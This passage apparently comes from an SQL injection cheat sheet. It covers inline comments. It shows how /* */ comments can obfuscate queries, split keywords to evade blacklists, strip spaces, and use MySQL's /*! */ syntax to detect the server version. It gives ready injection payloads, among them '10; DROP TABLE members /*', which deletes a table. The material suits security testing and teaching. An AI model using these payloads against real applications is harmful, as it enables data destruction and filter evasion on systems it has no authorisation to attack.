You can use inline comments to comment out the rest of a query as with line comments (by simply not closing the comment). They are also useful for manipulating characters to bypass filtering/blacklisting, remove spaces, and obfuscate queries. In MySQL, you can use its special comment syntax to detect the database and version.

Generic SQL comment syntax is:

- `/*Comment Here*/` (SMPOL)

Typical uses of inline comments:

- Obfuscation: `DROP/*comment*/sampletable`
- Breaking up a keyword to avoid filters: `DR/**/OP/*bypass blacklisting*/sampletable`
- Removing space characters: `SELECT/*avoid-spaces*/password/**/FROM/**/Members`

For MySQL only, you can use special comment syntax:

- `/*! MYSQL special comment format */` (M) 

This special comment syntax is perfect for detecting that MySQL is being used because any instructions you put in this comment will only execute in MySQL. You can even use this to detect the version. The following example will execute and generate an error only is the server uses MySQL in the specified version or later:

```sql
SELECT /*!80027 1/0, */ 1 FROM tablename
```

#### Classic inline comment SQL injection attack samples

- ID value: `10; DROP TABLE members /*`   
    Simply get rid of other stuff at the end the of query. Same as `10; DROP TABLE members --`
- `SELECT /*!**80027** 1/0, */ 1 FROM tablename`   
    Will throw an **division by 0 error** if MySQL version is higher than **8.0.27**

#### MySQL version detection sample attacks

- ID value: `/*!**80027** 10*/`
- ID value: `10`   
    You will get the **same response** if MySQL version is higher than **8.0.27**
- `SELECT /*!**80027** 1/0, */ 1 FROM tablename`   
    Will throw a **division by 0 error** if MySQL version is higher than **8.0.27**
